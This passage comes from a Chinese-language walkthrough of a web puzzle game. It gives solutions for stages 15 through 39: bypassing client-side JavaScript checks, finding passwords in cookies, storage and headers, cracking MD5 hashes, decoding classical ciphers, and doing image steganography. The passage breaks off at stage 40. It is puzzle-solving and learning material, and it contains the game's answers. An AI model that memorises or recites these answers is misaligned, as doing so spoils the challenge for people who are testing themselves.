16pt;\">![](http://cdn.anyiblog.top/common/eed41b898f977b66272b5525e78e1902.png)</span>\n<span style=\"font-size: 16pt;\">源代码有这么一段代码 无论你输入啥都是false</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/18f00bc8feed7754973ca6a1f0df17d2.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c4600d859a4abf9f66f96a607f418999.png)</span>\n<span style=\"font-size: 16pt;\">当时卡了一段时间</span>\n\n<span style=\"font-size: 16pt;\">后来我看到了这一段：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7164e188ecfbd470b6c89eff0b384d86.png)</span>\n<span style=\"font-size: 16pt;\">当我们点击确认密码的按钮时 会去check()函数获得值</span>\n\n<span style=\"font-size: 16pt;\">而check函数不论输入啥都会return false 所以不可能为true 因此我们输入啥都没有用</span>\n\n<span style=\"font-size: 16pt;\">我的办法就是把这题Ctrl+S下载到本地 把false改成true即可。</span>\n\n<span style=\"font-size: 16pt;\">（这里要用谷歌保存下来 不知道什么原因火狐保存本地打开好像没用）</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/04c03237356063ae62cda4a7d2adaeb7.png)</span>\n<span style=\"font-size: 16pt;\">改成true后保存 本地打开。</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e03ba055d6af932bf7d91e7f25dcac2f.png)</span>\n<span style=\"font-size: 16pt;\">直接点击确认，会先报错，然后再把我们跳转到新页面：</span>\n\n> <a id ='Stage16'><span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/0608d8fa00683302067a0bb329a59492.png)</span><span style=\"font-size: 16pt;\">17、Stage 16:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/77bfeff7cc20cb45494e6a058c189564.png)</span>\n<span style=\"font-size: 16pt;\">少了个按钮 和上题同理，本地添加一个按钮 然后本地打开即可。</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/eec979085896dc54ca46702e6ff04cac.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/849bc79a1d2bd62cd0048474faf4a98b.png)</span>\n<span style=\"font-size: 16pt;\">点击即可跳转下一关。</span>\n> <a id ='Stage17'><span style=\"font-size: 16pt;\">18、Stage 17:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/ab997b8d7c93cee54468581b3ac0c287.png)</span>\n<span style=\"font-size: 16pt;\">这里直接输入密码 发现错误</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/9e7344477aadcd03dd48cea87feb0155.png)</span>\n<span style=\"font-size: 16pt;\">看源码发现是把输入框的输入长度给限制了：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/5247860dba238509f2001f5b4479e4f5.png)</span>\n<span style=\"font-size: 16pt;\">把maxlength改高点在输入就可以了</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2bed9fa0123482bbc27d341aa340d0f1.png)</span>\n<span style=\"font-size: 16pt;\">输入即可下一关。</span>\n> <a id ='Stage18'><span style=\"font-size: 16pt;\">19、Stage 18:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6f173c9cba5440ea2d3dfbaf82f9530b.png)</span>\n<span style=\"font-size: 16pt;\">依旧是谷歌保存页面 然后本地添加按钮即可。</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b8d7bbaa397a486f47ca7fff68571858.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/fdc4b0f8aabab9d2bd1c92944bf1242c.png)</span>\n<span style=\"font-size: 16pt;\">点击按钮即可。</span>\n> <a id ='Stage19'><span style=\"font-size: 16pt;\">20、Stage 19:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e33678df179fb2edd093836c71ce2662.png)</span>\n<span style=\"font-size: 16pt;\">提示说根据前三关密码得出本关密码</span>\n\n<span style=\"font-size: 16pt;\">我们整理前面的md5值：</span>\n\n<span style=\"font-size: 16pt;\">18：</span><span style=\"font-size: 16pt;\">6f4922f45568161a8cdf4ad2299f6d23</span>\n\n<span style=\"font-size: 16pt;\">17：</span><span style=\"font-size: 16pt;\">70efdf2ec9b086079795c442636b55fb</span>\n\n<span style=\"font-size: 16pt;\">16：</span><span style=\"font-size: 16pt;\">c74d97b01eae257e44aa9d5bade97baf</span>\n\n<span style=\"font-size: 16pt;\">去somd5在线解密一下。</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2dd26c46f0421a0e823b991d60b44ed9.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7542f2576dd35be4df02088e044c94e0.png)</span>\n<span style=\"font-size: 16pt;\">这里其实就可以知道了 题目是以关卡数作为md5密码</span>\n\n<span style=\"font-size: 16pt;\">因此我们只要加密下19的md5 就是本关密码了：</span>\n\n<span style=\"font-size: 16pt;\">（用php或者python都可以）</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/cf58c1b7649b32681bdf05f383253262.png)</span>\n<span style=\"font-size: 16pt;\">密码为：</span><span style=\"font-size: 16pt;\">1f0e3dad99908345f7439f8ffabdffc4</span>\n\n<span style=\"font-size: 16pt;\">输入即可下一关。</span>\n> <a id ='Stage20'><span style=\"font-size: 16pt;\">21、Stage 20:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/9cbee0116ba5d82669a67f5417c16893.png)</span>\n<span style=\"font-size: 16pt;\">先看源代码：</span>\n\n<span style=\"font-size: 16pt;\">有这么一段js代码</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b5ef5e6c8b076c462ca78d0a15bd83cc.png)</span>\n<span style=\"font-size: 16pt;\">让我们计算a的值 然后跳转到a.html就可以了</span>\n\n<span style=\"font-size: 16pt;\">直接把js代码复制到python运行：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/55dc7f0c10004f411a89e01829521cdf.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/466c1f662cb25f4ff4ef18f506d80ff5.png)</span>\n<span style=\"font-size: 16pt;\">输入即可：</span>\n\n> <a id ='Stage21'><span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/a9bf3e599644fe9040c4fbc6cde42e13.png)</span><span style=\"font-size: 16pt;\">22、Stage 21:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/65dee3ee64129f28803960d7b3dd9ad4.png)</span>\n<span style=\"font-size: 16pt;\">看源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/854cffbd0a59da6c6d47fb502f3e3bd6.png)</span>\n<span style=\"font-size: 16pt;\">（上一关还可以绕过控制台）</span>\n\n<span style=\"font-size: 16pt;\">这里给出的是一堆ascii码 依旧用python解码</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6775d5040672aa0e519211d42450c41a.png)</span>\n<span style=\"font-size: 16pt;\">得到：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2761f0f6fd2969126bdafb7347291f01.png)</span>\n<span style=\"font-size: 16pt;\">直接访问</span><span style=\"font-size: 16pt;\">vuejs.html</span><span style=\"font-size: 16pt;\">即可。</span>\n> <a id ='Stage22'><span style=\"font-size: 16pt;\">23、Stage 22:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/745233a3d272b31275a44a4e7e0e8ce8.png)</span>\n<span style=\"font-size: 16pt;\">源代码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6e0444293d27c522e764d03c2583866b.png)</span>\n<span style=\"font-size: 16pt;\">这题卡了我很久 源代码没给一点提示 标题也没有 尝试了很久的密码都没找到 还在上一关找线索 最后也是无果。</span>\n\n<span style=\"font-size: 16pt;\">在网友的帮助下 得知这题的password藏在了cookie中</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/fec3c6a784f117d3007d259dc6656b84.png)</span>\n<span style=\"font-size: 16pt;\">真的是没想到啊 所以说题目还挺烧脑洞的。</span>\n\n<span style=\"font-size: 16pt;\">同时也就是说 接下来要看页面的属性了。</span>\n\n<span style=\"font-size: 16pt;\">输入密码即可下一关。</span>\n> <a id ='Stage23'><span style=\"font-size: 16pt;\">24、Stage 23:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/510a1c89b535453fa32cb2b481ca8a83.png)</span>\n<span style=\"font-size: 16pt;\">经过教训 这次先看属性：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/47f13be0aed52809ea0d67689bc53e7c.png)</span>\n<span style=\"font-size: 16pt;\">这次不在cookie中 看其他信息：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e1ba9c074474f6ce6bb4d962284d931e.png)</span>\n<span style=\"font-size: 16pt;\">最后在 本地存储中找到密码</span>\n\n<span style=\"font-size: 16pt;\">输入密码即可。</span>\n> <a id ='Stage24'><span style=\"font-size: 16pt;\">25、Stage 24:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e5e3efd3cedff6e5d7a0e0e55e459125.png)</span>\n<span style=\"font-size: 16pt;\">在一番查找后 不在存储类中了，尝试看看header头信息</span>\n\n<span style=\"font-size: 16pt;\">这里用postman访问网站：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c30a75557007116af6d4de7f7771dca8.png)</span>\n<span style=\"font-size: 16pt;\">在header中找到密码</span>\n\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage25'><span style=\"font-size: 16pt;\">26、Stage 25:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/30f200cd814612e23c316851b8bd4712.png)</span>\n<span style=\"font-size: 16pt;\">题目给了一串数字。</span><span style=\"font-size: 16pt; color: unset; font-family: unset;\">5 11 14 22 4 17</span>\n\n<span style=\"font-size: 16pt;\">先看源代码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/725b2542c35f69d17d46f38721faf3ae.png)</span>\n<span style=\"font-size: 16pt;\">结合标题letter字母 和 本题url abc猜测这串数字可能是字母表中顺序</span>\n\n<span style=\"font-size: 16pt;\">用python写：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b544949a6c42317de5724f11f15451d0.png)</span>\n<span style=\"font-size: 16pt;\">得到密码flower：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/cceef4ca203cbc60bdd9ba867b1a8d40.png)</span>\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage26'><span style=\"font-size: 16pt;\">27、Stage 26:</span></a>\n<span style=\"font-size: 16pt;\">（这里开始偏向misc了 隐写 图片分析等等）</span>\n\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/f5142800af82d93d2686fc8118d8d629.png)</span>\n<span style=\"font-size: 16pt;\">看源代码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b9f42708e310dbdbc71701ac5c87274c.png)</span>\n<span style=\"font-size: 16pt;\">标题提示图片中有东西 又是一张rar图片。</span>\n\n<span style=\"font-size: 16pt;\">先将图片保存到本地</span>\n\n<span style=\"font-size: 16pt;\">用winhex分析 </span><span style=\"font-size: 16pt; color: unset; font-family: unset;\">直接拖到尾部看额外数据：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b9e65f7aa9a05a16ed12e89706b63a4b.png)</span>\n<span style=\"font-size: 16pt;\">明显图片中有压缩包 可以直接改后缀（吐槽一下图片是rar为什么给的zip的头 虽然也是能打开）：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/df4246db40efe9d8976e91909709eef8.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/80973a8dc4a16bc4084ce9c18c6985e8.png)</span>\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage27'><span style=\"font-size: 16pt;\">28、Stage 27:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/760d015c5248ae75af68e6c75d14f40e.png)</span>\n<span style=\"font-size: 16pt;\">提示说在图片中：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/35210e5d07728ccad602cf5ed650824b.png)</span>\n<span style=\"font-size: 16pt;\">直接保存 分析</span>\n\n<span style=\"font-size: 16pt;\">拉到尾部：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/bb516c5c15dc1bfb1dd8866e5a511c59.png)</span>\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage28'><span style=\"font-size: 16pt;\">29、Stage 28:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/3072f9148c8da8823260c8d6643c3212.png)</span>\n<span style=\"font-size: 16pt;\">这里是刚开始是一张图片 然后又替换成另一张图片了（图片中藏着五个半透明字母）：</span>\n\n<span style=\"font-size: 16pt;\">（这是首页图片）</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2cf2373f107c70af3a485153401cfc8c.png)</span>\n<span style=\"font-size: 16pt;\">（隐藏的图片）</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c2161cb3c7b522e8b242853ffa20356e.png)</span>\n<span style=\"font-size: 16pt;\">两者少了一个/ 差的很多。</span>\n\n<span style=\"font-size: 16pt;\">图片能零零散散看到几个字母：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e05355c5a75a27175658ef976ea60243.png)</span>\n<span style=\"font-size: 16pt;\">这里可以把两张图片保存下来然后用stegsolve对比一下 更清晰</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c965be454b0e8a6f131e77c95aad8a5e.png)</span>\n<span style=\"font-size: 16pt;\">字母是h u r t t</span>\n\n<span style=\"font-size: 16pt;\">这里又是一个坑 顺序呢？</span>\n\n<span style=\"font-size: 16pt;\">也是卡了一会 然后找到了一个字母组成单词的网站：</span>\n\n<span style=\"font-size: 16pt;\">[http://wordsolver.net/#](http://wordsolver.net/#)</span>\n\n![](http://cdn.anyiblog.top/common/efd2c65572a0e26abd20624ef2f0620f.png)\n所以是truth.html\n\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage29'><span style=\"font-size: 16pt;\">30、Stage 29:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/a061bbde6c4a4847a1f6634ecd2a3f4f.png)</span>\n<span style=\"font-size: 16pt;\">保存图片 直接用winhex分析：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/a6fdf06df9ba7d020ee60c8bf055966e.png)</span>\n<span style=\"font-size: 16pt;\">这里搜索FFD9（jpg文件的结尾头） 发现有额外数据</span>\n\n<span style=\"font-size: 16pt;\">结合提示：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/8ed4d5cc17493cd926334d692cc4596b.png)</span>\n<span style=\"font-size: 16pt;\">这是base64的data数据流</span>\n\n<span style=\"font-size: 16pt;\">这里</span><span style=\"font-size: 16pt;\">写html或者在线解码</span>\n\n<span style=\"font-size: 16pt;\">直接写html：（<img src=\"png;base64,xxxx\" />）</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7aa420a66e24d2525b7ff040b29ae9be.png)</span>\n<span style=\"font-size: 16pt;\">得到图片：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/dd374bd9d1b4b09619d9474bc4abd64a.png)</span>\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage30'><span style=\"font-size: 16pt;\">31、Stage 30:</span></a>\n<span style=\"font-size: 16pt;\">又是密码题</span>\n\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/261b550aa1f63884d8ee3a4b088baa74.png)</span>\n<span style=\"font-size: 16pt;\">看源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/4998c9a4a9dcf36e4654ce211e6d38fc.png)</span>\n<span style=\"font-size: 16pt;\">标题说提交按钮有密码</span>\n\n<span style=\"font-size: 16pt;\">F12看元素 这里一个技巧是可以直接搜索passwd</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/bef45596fbaa0cef0882351aa568afd5.png)</span>\n<span style=\"font-size: 16pt;\">得到密码为 content的内容</span>\n\n<span style=\"font-size: 16pt; color: unset; font-family: unset;\">提交即可。</span>\n> <a id ='Stage31'><span style=\"font-size: 16pt;\">32、Stage 31:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/dae67a7ec5e3ed43f5b0135987ed3e97.png)</span>\n<span style=\"font-size: 16pt;\">本来是html 但是l的部分被划掉了</span>\n\n<span style=\"font-size: 16pt;\">烧脑洞的地方是要想到把html 去掉 l</span>\n\n<span style=\"font-size: 16pt;\">访问xx.htm</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/54125278c01908b7dce75bd59d7ec079.png)</span>\n<span style=\"font-size: 16pt;\">结果被跳转到了首页：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/a4434d7af2b26e9abd91eda93cd8fa14.png)</span>\n<span style=\"font-size: 16pt;\">用postman 或者 python截取网站内容：</span><span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2bfc3c7bd95e13af93962acecd32101b.png)</span>\n<span style=\"font-size: 16pt;\">访问url即可。</span>\n> <a id ='Stage32'><span style=\"font-size: 16pt;\">33、Stage 32:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/07c518105d5d74a796e19839230c398a.png)</span>\n<span style=\"font-size: 16pt;\">源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/126fd691b7a31e18083a7f8b579f0b0d.png)</span>\n<span style=\"font-size: 16pt;\">标题提示说找到Big Monster</span>\n\n<span style=\"font-size: 16pt;\">这里结合网友提示 这是电影《神秘博士》中反派Davros</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b6938beb502e17111b5359d2e008a95d.png)</span>\n<span style=\"font-size: 16pt;\">因此访问Davros.html即可。</span>\n> <a id ='Stage33'><span style=\"font-size: 16pt;\">34、Stage 33:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/07623053722c44effd4f226ee3f73baf.png)</span>\n<span style=\"font-size: 16pt;\">这里访问url就会跳转到首页</span>\n\n<span style=\"font-size: 16pt;\">源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6e43ffaf4773acde1448f76dce6fa32a.png)</span>\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage34'><span style=\"font-size: 16pt;\">35、Stage 34:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/5aca21fd9efce762a1f4bcd5d29f4291.png)</span>\n<span style=\"font-size: 16pt;\">源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/3022ab8d39bad80fe749624400246f18.png)</span>\n<span style=\"font-size: 16pt;\">百度搜下OSK</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/3bc748d8c1c743673fc9be91e6b770d0.png)</span>\n<span style=\"font-size: 16pt;\">这是qwerty键盘密码 跟字母表对应即可。</span>\n\n<span style=\"font-size: 16pt;\">写python脚本：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/5b3437d26d1055e5bebb5686f04dabdd.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6d18b0d0c359726f3629a40333354e41.png)</span>\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage35'><span style=\"font-size: 16pt;\">36、Stage 35:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/4b43e89811e468501826ef8cd34cd2f2.png)</span>\n<span style=\"font-size: 16pt;\">网页给了一张gif</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7c119a39bb9c5394be162ade16b39036.png)</span>\n<span style=\"font-size: 16pt;\">直接保存到本地 用stegsolve跳到最后一帧</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/9648df3b92e5a72ad2094f20f315a71b.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/0a24d8faf5c13e397f4dddd064edb42c.png)</span>\n<span style=\"font-size: 16pt;\">最后访问即可。</span>\n> <a id ='Stage36'><span style=\"font-size: 16pt;\">37、Stage 36:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/4ce742ceb85726046ee91701c9f1aa17.png)</span>\n<span style=\"font-size: 16pt;\">这个是数独 用9x9数独解</span><span style=\"font-size: 16pt;\">[https://www.toycl.com/sudu/sudoku.php](https://www.toycl.com/sudu/sudoku.php)</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c3f3dd21d3071d6bb4d9a12b9afa2ece.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/214836613dbadc2c81925a752aa230ae.png)</span>\n<span style=\"font-size: 16pt;\">根据图中黄色部分 猜测密码为1983</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/0b0b1b28b60f1ffacb289ec332ad4517.png)</span>\n<span style=\"font-size: 16pt;\">报错了 但是提示我们用在图片上</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/ba97a191bc12fbb895e434c6e250c0cb.png)</span>\n<span style=\"font-size: 16pt;\">所以就访问url:</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/3b600acef331b7381d526f2379a11970.png)</span>\n<span style=\"font-size: 16pt;\">得到一张图片：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e29e6205d3605b66c21da4e6c17bdca5.png)</span>\n<span style=\"font-size: 16pt;\">通过百度识图 在一张文章中找到线索</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/adbaa94bd3fe38c6c38722d73ad59ba4.png)</span>\n<span style=\"font-size: 16pt;\">这台电脑叫做lisa 所以尝试访问lisa.jpg</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b45f50932920f23e3830ee3249d04328.png)</span>\n<span style=\"font-size: 16pt;\">这里有一个坑就是你找到这个人的人名是不对的，因为这张图片还藏有一张图片</span>\n\n<span style=\"font-size: 16pt;\">先本地保存</span>\n\n<span style=\"font-size: 16pt;\">在图片备注处发现：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/26ea20c0af4a7016d225d84d4a0d3cef.png)</span>\n<span style=\"font-size: 16pt;\">让我们用win7查看 所以启动虚拟机</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/82aafd9f8fdf28aa40c74536ba5fb14c.png)</span>\n<span style=\"font-size: 16pt;\">在缩略图中发现不一样。找到这个人就是密码了。</span>\n\n<span style=\"font-size: 16pt;\">在网友的帮助下得知这是川宝</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/d3a460ebed3f3f99dedc422e5ea51f9b.png)</span>\n<span style=\"font-size: 16pt;\">Donald就是密码了</span>\n\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage37'><span style=\"font-size: 16pt;\">38、Stage 37:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/11821a388f5368489ac9d8ca4791ede9.png)</span>\n<span style=\"font-size: 16pt;\">这题不会看三维图的我直接放弃了，</span>\n\n<span style=\"font-size: 16pt;\">这种裸眼3d图真的看不出来。。。</span>\n\n<span style=\"font-size: 16pt;\">好在网友帮助下 得知这好像是三体 图片中的内容是三体的logo</span>\n\n<span style=\"font-size: 16pt;\">以三体英文名作为url访问即可</span>\n> <a id ='Stage38'><span style=\"font-size: 16pt;\">39、Stage 38:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/ac1f62f379e58d2dccfb119080b43beb.png)</span>\n<span style=\"font-size: 16pt;\">密文：ADDFADAFAG</span>\n\n<span style=\"font-size: 16pt;\">先看源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/4ebcf577c4666eb3bcc0bbb4515c90b8.png)</span>\n<span style=\"font-size: 16pt;\">标题提示ADFGX 先了解下这个东西</span>\n\n<span style=\"font-size: 16pt;\">利用google或者wiki查询资料</span>\n\n<span style=\"font-size: 16pt;\">可参考</span><span style=\"font-size: 16pt;\">[https://xz.aliyun.com/t/3603](https://xz.aliyun.com/t/3603) 讲的很细</span>\n\n<span style=\"font-size: 16pt;\">但是这里的ADFGX是没有所谓的移位密钥和密钥的。也就是说对着表就可以找到单词了。</span>\n\n<span style=\"font-size: 16pt;\">要注意的是 不同的表的结果是不一样的。这里参考wiki的表就可以解出来</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/0bf9114e37095eeecd338b4caf1d3149.png)</span>\n<span style=\"font-size: 16pt;\">AD DF AD AF AG</span>\n\n<span style=\"font-size: 16pt;\">得到 t o t a l</span>\n\n<span style=\"font-size: 16pt;\">使用total作为密码输入即可。</span>\n> <a id ='Stage39'><span style=\"font-size: 16pt;\">40、Stage 39:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/daafb328548f060b367239cef43fa79b.png)</span>\n<span style=\"font-size: 16pt;\">密文：GDVFXVAX AAFFVGFX</span>\n\n<span style=\"font-size: 16pt;\">这题和上题相似 只不过是ADFGX的变种 ADFGVX加密</span>\n\n<span style=\"font-size: 16pt;\">区别就是表从5x5变为6x6 并且密文中含有字母V</span>\n\n<span style=\"font-size: 16pt;\">这题我卡了十几个小时 因为呢这题直接找表是不可行的 大多数的表都是不对的 因为题目用的表不是常规的</span>\n\n<span style=\"font-size: 16pt;\">当时我去找自己写了个爆破脚本 遍历移位密钥和表 最后也是无果 因为表不一样结果就是不一样的。</span>\n\n<span style=\"font-size: 16pt;\">昨晚也是做的很无奈 匆匆下了班。</span>\n\n<span style=\"font-size: 16pt;\">早上我来的时候 出窍了。</span>\n\n<span style=\"font-size: 16pt;\">一番信息搜索过后，</span>\n\n<span style=\"font-size: 16pt;\">根据网友提示说图片很重要</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2eb5ecf6319c7cce38a35e77886566b8.png)</span>\n<span style=\"font-size: 16pt;\">既然有encode 那有没有decode呢？？？</span>\n\n<span style=\"font-size: 16pt;\">直接访问url</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/e148a5a4829d877c749babddd7f68567.png)</span>\n<span style=\"font-size: 16pt;\">我去，果然有。。。</span>\n\n<span style=\"font-size: 16pt;\">所以说 这是信息搜集能力吗 算是吧？</span>\n\n<span style=\"font-size: 16pt;\">然后把密文对照表 一一对应</span>\n\n<span style=\"font-size: 16pt;\">GD=L VF=E XV=F AX=T AA=H FF=A VG=N FX=D</span>\n\n<span style=\"font-size: 16pt;\">最后LEFT HAND 作为密码提交即可</span>\n\n<span style=\"font-size: 16pt;\">卡了半天的题 总算是做出来了，也算是功夫不负有心人呐</span>\n> <a id ='Stage40'><span style=\"font-size: 16pt;\">41、Stage 40:</span></a>\n<span style=\"font-size: 16pt;\">这题没做出来 只有一点点思路 有想法的师傅可以交流</span>\n\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\"><span style=\"text-decoration: 